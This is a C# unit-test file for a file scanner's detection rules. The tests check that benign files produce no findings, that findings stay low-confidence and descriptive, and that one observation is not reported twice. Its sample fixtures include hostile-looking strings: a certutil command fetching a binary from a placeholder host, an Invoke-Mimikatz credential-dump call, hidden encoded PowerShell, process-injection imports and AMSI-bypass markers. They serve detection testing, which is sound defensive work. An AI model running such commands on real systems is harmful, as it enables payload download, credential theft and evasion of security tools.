using System.Text;
using Lumen.Core.Abstractions;
using Lumen.Core.Detection;
using Lumen.Core.Models;
using Lumen.Core.Scanning;

namespace Lumen.Core.Tests;

/// <summary>
/// Tests for the quality of the detection rules rather than for their reach.
/// </summary>
/// <remarks>
/// <para>
/// A scanner that cries wolf on a healthy machine is worse than one that stays quiet, so
/// these tests check that ordinary files produce nothing, that a finding describes what was
/// observed instead of reaching a conclusion, and that one observation is never reported
/// twice under two different rule identifiers.
/// </para>
/// <para>
/// Every fixture here is synthetic and built in memory. No real file, no real document and
/// no network access is involved.
/// </para>
/// </remarks>
public sealed class DetectionQualityTests
{
    /// <summary>A folder a user can freely write to and run from.</summary>
    private const string WritableRoot = @"C:\Users\test\AppData\Local\Temp";

    /// <summary>A folder a user cannot replace, where unsigned software is perfectly normal.</summary>
    private const string ProtectedRoot = @"C:\Program Files\Contoso\Tool";

    private static readonly FakeClock Clock = new() { UtcNow = new DateTimeOffset(2026, 1, 1, 12, 0, 0, TimeSpan.Zero) };

    // ---------------------------------------------------------------- the unsigned executable rule

    [Fact]
    public void An_unsigned_executable_in_a_folder_the_user_can_write_to_is_reported()
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage());

        var findings = detector.Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.unsigned-executable");
    }

    [Fact]
    public void An_unsigned_executable_in_an_ordinary_folder_is_not_reported()
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{ProtectedRoot}\tool.exe",
            DetectionFixtures.PeImage());

        var findings = detector.Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.unsigned-executable");
    }

    [Fact]
    public void The_unsigned_executable_finding_is_never_more_than_a_low_confidence_hint()
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage());

        var finding = detector.Inspect(probe, CancellationToken.None)
            .Single(candidate => candidate.RuleId == "pe.unsigned-executable");

        Assert.Equal(Confidence.Low, finding.Confidence);
        Assert.NotEqual(Confidence.Definitive, finding.Confidence);
        Assert.NotEqual(Confidence.High, finding.Confidence);
    }

    [Theory]
    [InlineData("Title")]
    [InlineData("Summary")]
    [InlineData("Detail")]
    [InlineData("Advice")]
    public void The_unsigned_executable_finding_describes_what_was_seen_and_not_a_verdict(string part)
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage());

        var finding = detector.Inspect(probe, CancellationToken.None)
            .Single(candidate => candidate.RuleId == "pe.unsigned-executable");

        var text = part switch
        {
            "Title" => finding.Title,
            "Summary" => finding.Summary,
            "Detail" => finding.Detail,
            _ => finding.Advice
        };

        Assert.DoesNotContain("malware", text, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("virus", text, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void The_unsigned_executable_finding_says_how_to_check_the_file()
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage());

        var finding = detector.Inspect(probe, CancellationToken.None)
            .Single(candidate => candidate.RuleId == "pe.unsigned-executable");

        Assert.Contains("signature", finding.Advice, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("before you run it", finding.Advice, StringComparison.OrdinalIgnoreCase);
    }

    // ---------------------------------------------------------------- the location check itself

    [Fact]
    public void A_sibling_folder_is_not_inside_the_target_folder()
    {
        var locations = new DefaultSuspiciousLocation([@"C:\Temp"]);

        Assert.False(locations.IsSuspicious(@"C:\Temp2\tool.exe"));
        Assert.False(locations.IsSuspicious(@"C:\Temp2\deeper\tool.exe"));
        Assert.True(locations.IsSuspicious(@"C:\Temp\tool.exe"));
    }

    [Fact]
    public void A_sibling_folder_on_disk_is_not_inside_the_target_folder()
    {
        using var temp = new TempDirectory();
        var target = temp.CreateDirectory("target");
        var sibling = temp.CreateDirectory("target2");

        var locations = new DefaultSuspiciousLocation([target]);

        Assert.True(locations.IsSuspicious(Path.Combine(target, "tool.exe")));
        Assert.False(locations.IsSuspicious(Path.Combine(sibling, "tool.exe")));
    }

    [Fact]
    public void The_default_location_knows_the_folders_of_the_machine_it_runs_on()
    {
        var locations = new DefaultSuspiciousLocation();

        var temp = Path.GetTempPath();
        var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

        Assert.True(locations.IsSuspicious(Path.Combine(temp, "dropped.exe")));
        if (!string.IsNullOrWhiteSpace(localAppData))
        {
            Assert.True(locations.IsSuspicious(Path.Combine(localAppData, "dropped.exe")));
        }

        if (!string.IsNullOrWhiteSpace(programFiles))
        {
            Assert.False(locations.IsSuspicious(Path.Combine(programFiles, "Contoso", "tool.exe")));
        }
    }

    [Fact]
    public void A_path_with_no_folder_at_all_is_not_cleared_without_being_placed()
    {
        var locations = new DefaultSuspiciousLocation([WritableRoot]);

        Assert.True(locations.IsSuspicious("tool.exe"));
        Assert.False(locations.IsSuspicious(""));
        Assert.False(locations.IsSuspicious("   "));
    }

    // ---------------------------------------------------------------- the engine is not blinded

    [Fact]
    public void A_signed_executable_in_a_suspicious_folder_is_still_reported_by_the_content_rules()
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread"])],
                Certificate = ValidCertificate()
            }));

        var findings = detector.Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.suspicious-api-import");
        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.unsigned-executable");
    }

    [Fact]
    public void An_unsigned_executable_in_a_suspicious_folder_is_still_reported_by_the_content_rules()
    {
        var detector = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread"])]
            }));

        var findings = detector.Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.suspicious-api-import");
        Assert.Contains(findings, finding => finding.RuleId == "pe.unsigned-executable");
    }

    [Fact]
    public void A_signed_executable_whose_signature_was_not_read_is_not_called_invalid()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Certificate = ValidCertificate()
        });

        // The scanner only read the beginning of the file, so the certificate table may be
        // past the end of what was read. Nothing can be said about the signature then.
        var probe = new FileProbe(
            $@"{WritableRoot}\tool.exe",
            image.LongLength * 4,
            FileAttributes.Normal,
            image,
            contentTruncated: true);

        var findings = Detector(locations: new DefaultSuspiciousLocation([WritableRoot]))
            .Inspect(probe, CancellationToken.None)
            .ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.invalid-digital-signature");
    }

    [Fact]
    public void A_benign_file_produces_no_findings_at_all()
    {
        var registry = DetectorRegistry.CreateDefault(null, new DefaultSuspiciousLocation([WritableRoot]));
        var probe = FileProbe.FromBytes(
            $@"{ProtectedRoot}\notes.txt",
            Encoding.UTF8.GetBytes("Shopping list: bread, milk and a note about the garden."));

        var findings = registry.Inspect(probe, CancellationToken.None);

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- one observation, one finding

    [Fact]
    public void A_script_that_mentions_the_scanning_interface_is_reported_once()
    {
        var registry = DetectorRegistry.CreateDefault();
        var probe = FileProbe.FromText("run.ps1", "Write-Host 'AmsiScanBuffer'");

        var findings = registry.Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "sig.amsi-bypass-marker");
        Assert.DoesNotContain(findings, finding => finding.RuleId == "script.amsi-bypass");
    }

    [Fact]
    public void A_script_that_mentions_the_other_scanning_interface_names_is_reported_by_the_script_rule()
    {
        var registry = DetectorRegistry.CreateDefault();
        var probe = FileProbe.FromText("run.ps1", "Write-Host 'AmsiUtils'");

        var findings = registry.Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.amsi-bypass");
        Assert.DoesNotContain(findings, finding => finding.RuleId == "sig.amsi-bypass-marker");
    }

    [Fact]
    public void A_macro_enabled_document_with_a_visual_basic_project_is_not_reported_twice()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec("word/vbaProject.bin", Encoding.UTF8.GetBytes("Attribute VB_Name = \"Module1\"")));

        var findings = new OfficeMacroDetector()
            .Inspect(FileProbe.FromBytes("sheet.xlsm", document), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.vba-macro-project");
        Assert.DoesNotContain(findings, finding => finding.RuleId == "office.macro-enabled-extension");
    }

    [Fact]
    public void A_macro_enabled_file_name_without_a_project_is_still_reported()
    {
        var findings = new OfficeMacroDetector()
            .Inspect(FileProbe.FromText("sheet.xlsm", "plain content"), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.macro-enabled-extension");
    }

    [Fact]
    public void A_shortcut_to_a_program_installed_under_the_user_profile_is_not_reported_as_temporary()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Users\test\AppData\Local\Programs\Contoso\contoso.exe");

        var findings = new ShortcutDetector()
            .Inspect(FileProbe.FromBytes("contoso.lnk", shortcut), CancellationToken.None)
            .ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "shortcut.temp-path-target");
    }

    [Fact]
    public void A_shortcut_to_a_temporary_folder_is_still_reported()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Users\test\AppData\Local\Temp\drop.exe");

        var findings = new ShortcutDetector()
            .Inspect(FileProbe.FromBytes("drop.lnk", shortcut), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "shortcut.temp-path-target");
    }

    [Fact]
    public void An_archive_of_script_files_is_not_reported_as_carrying_a_program()
    {
        var archive = DetectionFixtures.Zip(
            new ZipEntrySpec("app.js", Encoding.UTF8.GetBytes("console.log('hello');")),
            new ZipEntrySpec("site.css", Encoding.UTF8.GetBytes("body { color: black; }")));

        var findings = new ArchiveDetector()
            .Inspect(FileProbe.FromBytes("project.zip", archive), CancellationToken.None)
            .ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "archive.executable-inside");
    }

    [Fact]
    public void An_archive_with_a_disguised_program_is_still_reported()
    {
        var archive = DetectionFixtures.Zip(
            new ZipEntrySpec("notes.txt", [0x4D, 0x5A, 0x90, 0x00]));

        var findings = new ArchiveDetector()
            .Inspect(FileProbe.FromBytes("bundle.zip", archive), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "archive.executable-inside");
    }

    // ---------------------------------------------------------------- the catalogue

    [Fact]
    public void Every_rule_the_detectors_report_is_documented_in_the_catalog()
    {
        var registry = DetectorRegistry.CreateDefault(null, new DefaultSuspiciousLocation([WritableRoot]));
        var documented = DetectionCatalog.Rules.Select(rule => rule.Id).ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var probe in SampleProbes())
        {
            foreach (var finding in registry.Inspect(probe, CancellationToken.None))
            {
                Assert.Contains(finding.RuleId, documented);
            }
        }
    }

    [Fact]
    public void The_catalog_describes_every_rule_it_lists()
    {
        var ids = DetectionCatalog.Rules.Select(rule => rule.Id).ToArray();

        Assert.Equal(ids.Length, ids.Distinct(StringComparer.OrdinalIgnoreCase).Count());
        Assert.All(DetectionCatalog.Rules, rule => Assert.False(string.IsNullOrWhiteSpace(rule.Description)));
        Assert.All(DetectionCatalog.Rules, rule => Assert.False(string.IsNullOrWhiteSpace(rule.Name)));
    }

    [Fact]
    public void The_catalog_describes_the_unsigned_executable_rule_the_way_it_behaves()
    {
        var rule = DetectionCatalog.Rules.Single(candidate => candidate.Id == "pe.unsigned-executable");

        Assert.Equal(Confidence.Low, rule.Confidence);
        Assert.Contains("signature", rule.Description, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("write to", rule.Description, StringComparison.OrdinalIgnoreCase);
    }

    // ---------------------------------------------------------------- helpers

    private static PortableExecutableDetector Detector(ISuspiciousLocation locations) =>
        new(Clock, locations);

    private static IEnumerable<FileProbe> SampleProbes()
    {
        yield return FileProbe.FromText("run.ps1", "Invoke-Mimikatz -dump; New-Service -Name x -DisplayName y");
        yield return FileProbe.FromText("fetch.cmd", "certutil -urlcache -split -f https://example.invalid/a.bin");
        yield return FileProbe.FromText("stealth.txt", "powershell -w hidden -enc SQBFAFgA");
        yield return FileProbe.FromBytes(
            $@"{WritableRoot}\packed.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec("UPX0", DetectionFixtures.HighEntropyBytes(4096), 0xC000_0040)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory"])]
            }));
        yield return FileProbe.FromBytes("invoice.doc", DetectionFixtures.OleCompoundFile(Encoding.ASCII.GetBytes("AutoOpen")));
        yield return FileProbe.FromBytes("form.pdf", DetectionFixtures.Pdf("/Type /Action /S /JavaScript"));
        yield return FileProbe.FromBytes("bundle.zip", DetectionFixtures.Zip(new ZipEntrySpec("setup.exe", [0x4D, 0x5A])));
        yield return FileProbe.FromBytes("run.lnk", DetectionFixtures.Shortcut(@"C:\Windows\System32\wscript.exe"));
        yield return FileProbe.FromBytes("blob.bin", DetectionFixtures.HighEntropyBytes(8192));
        yield return FileProbe.FromBytes("eicar.com", TestData.EicarBytes());
    }

    /// <summary>
    /// Builds a certificate table that reads as a well-formed signed-data blob, so the file
    /// counts as signed.
    /// </summary>
    private static byte[] ValidCertificate()
    {
        // A WIN_CERTIFICATE structure that starts with the PKCS#7 signed-data marker.
        var oid = new byte[] { 0x06, 0x09, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04 };
        var certificate = new byte[8 + oid.Length + 16];
        certificate[4] = 0x00;
        certificate[5] = 0x02;
        certificate[6] = 0x02;
        certificate[7] = 0x00;
        oid.CopyTo(certificate, 8);
        return certificate;
    }
}
